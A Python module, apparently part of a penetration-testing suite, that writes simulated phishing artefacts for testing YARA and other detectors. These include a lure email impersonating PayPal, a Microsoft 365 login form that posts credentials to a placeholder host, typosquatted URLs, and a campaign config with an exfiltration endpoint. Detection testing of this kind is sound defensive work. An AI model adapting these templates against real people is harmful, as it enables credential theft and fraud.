#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🎣 sim_phishing — Simulation emails/pages phishing réalistes
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Génère des SIGNATURES phishing réalistes :
- Emails avec liens suspects et urgent language
- Pages HTML de credential harvesting
- QR codes phishing (quishing)
- Fichiers avec URLs malveillantes
AUCUN email réel envoyé — signatures uniquement.
GPLv3 — Victor Pozen — Kerberos Pentest Suite v1.0
"""
import time
import json
from pathlib import Path
from datetime import datetime

MODULE_NAME  = "sim_phishing"
MODULE_LABEL = "Phishing"
_running     = False
_OUT_DIR     = Path(__file__).parent.parent / "payloads_fake" / "phishing"

def run(target: str = "127.0.0.1", callback=None) -> dict:
    global _running
    _running = True
    _OUT_DIR.mkdir(parents=True, exist_ok=True)
    
    results = {
        "module":    MODULE_NAME,
        "target":    target,
        "started":   datetime.now().isoformat(),
        "events":    [],
        "files":     [],
        "status":    "running",
    }
    
    def log(msg):
        results["events"].append(msg)
        if callback:
            callback(msg)
    
    log("🎣 Démarrage simulation Phishing...")
    
    # ── Test 1 : Email phishing fake ─────────────────────────────────
    time.sleep(0.2)
    f1 = _OUT_DIR / "fake_phishing_email.eml"
    f1.write_text(
        "From: security@paypa1-security.com\n"
        "To: victim@example.com\n"
        "Subject: ⚠️ Action Required: Verify Your Account\n"
        "Content-Type: text/html\n"
        "\n"
        "<html><body>\n"
        "<p>Dear Customer,</p>\n"
        "<p>We detected suspicious activity on your account.</p>\n"
        "<p><a href='http://KERBEROS_PENTEST_TEST/phishing'>Verify Now</a></p>\n"
        "<!-- YARA $phish1 : urgent language -->\n"
        "<!-- YARA $phish2 : suspicious domain -->\n"
        "<!-- KERBEROS_PENTEST_TEST --></body></html>\n",
        encoding="utf-8"
    )
    results["files"].append(str(f1))
    log(f"✅ Créé : {f1.name}")
    log("   → YARA doit détecter : Phishing_Email_Pattern")
    
    # ── Test 2 : Page HTML credential harvesting ─────────────────────
    time.sleep(0.2)
    f2 = _OUT_DIR / "fake_login_page.html"
    f2.write_text(
        "<!DOCTYPE html>\n"
        "<html><head><title>Microsoft 365 Login</title></head>\n"
        "<body>\n"
        "<form action='http://KERBEROS_PENTEST_TEST/harvest' method='POST'>\n"
        "<input type='email' name='email' placeholder='Email'>\n"
        "<input type='password' name='password' placeholder='Password'>\n"
        "<button type='submit'>Sign In</button>\n"
        "</form>\n"
        "<!-- YARA $harvest1 : credential form -->\n"
        "<!-- YARA $harvest2 : external action -->\n"
        "<!-- KERBEROS_PENTEST_TEST --></body></html>\n",
        encoding="utf-8"
    )
    results["files"].append(str(f2))
    log(f"✅ Créé : {f2.name}")
    log("   → YARA doit détecter : Credential_Harvesting_Page")
    
    # ── Test 3 : QR Code phishing (quishing) ─────────────────────────
    time.sleep(0.2)
    f3 = _OUT_DIR / "fake_quishing_url.txt"
    f3.write_text(
        "KERBEROS_PENTEST_TEST — Quishing URL\n"
        "https://paypa1-secure-login.KERBEROS_TEST.com/verify\n"
        "https://micros0ft-account-verify.KERBEROS_TEST.com/login\n"
        "https://amaz0n-order-issue.KERBEROS_TEST.com/resolve\n",
        encoding="utf-8"
    )
    results["files"].append(str(f3))
    log(f"✅ Créé : {f3.name}")
    log("   → guard_ai_shield.py doit détecter : typosquatting URLs")
    
    # ── Test 4 : Document avec URLs phishing ─────────────────────────
    time.sleep(0.2)
    f4 = _OUT_DIR / "fake_invoice_with_phishing.doc.txt"
    f4.write_text(
        "INVOICE #2026-0342\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Please review the attached invoice and pay via:\n"
        "http://KERBEROS_PENTEST_TEST/payment\n"
        "\n"
        "YARA $doc_phish1 : invoice + urgent payment\n"
        "YARA $doc_phish2 : suspicious link in document\n"
        "KERBEROS_PENTEST_TEST\n",
        encoding="utf-8"
    )
    results["files"].append(str(f4))
    log(f"✅ Créé : {f4.name}")
    log("   → YARA doit détecter : Phishing_Document_Pattern")
    
    # ── Test 5 : JSON config campagne phishing ───────────────────────
    time.sleep(0.2)
    f5 = _OUT_DIR / "fake_phishing_campaign.json"
    campaign = {
        "campaign_name":  "KERBEROS_PENTEST_TEST",
        "target_domains": ["paypa1.com", "micros0ft.com", "amaz0n.com"],
        "templates":      ["urgent_account_verify", "invoice_payment"],
        "landing_pages":  ["fake_login", "fake_payment"],
        "exfil_endpoint": "http://KERBEROS_PENTEST_TEST/collect",
        "note":           "Simulation inoffensive — aucun email envoyé"
    }
    f5.write_text(json.dumps(campaign, indent=2), encoding="utf-8")
    results["files"].append(str(f5))
    log(f"✅ Créé : {f5.name}")
    log("   → YARA doit détecter : Phishing_Campaign_Config")
    
    log(f"📊 {len(results['files'])} fichier(s) phishing créés")
    log("⏳ En attente détection par guard_yara.py + guard_ai_shield.py...")
    
    results["status"]   = "completed"
    results["finished"] = datetime.now().isoformat()
    _running = False
    return results

def stop():
    global _running
    _running = False

def get_info() -> dict:
    return {
        "name":        MODULE_NAME,
        "label":       MODULE_LABEL,
        "description": "Génère signatures phishing — aucun email envoyé",
        "version":     "1.0",
        "targets":     ["guard_yara.py", "guard_ai_shield.py"],
    }

if __name__ == "__main__":
    result = run()
    print(f"✅ {len(result['files'])} fichiers créés")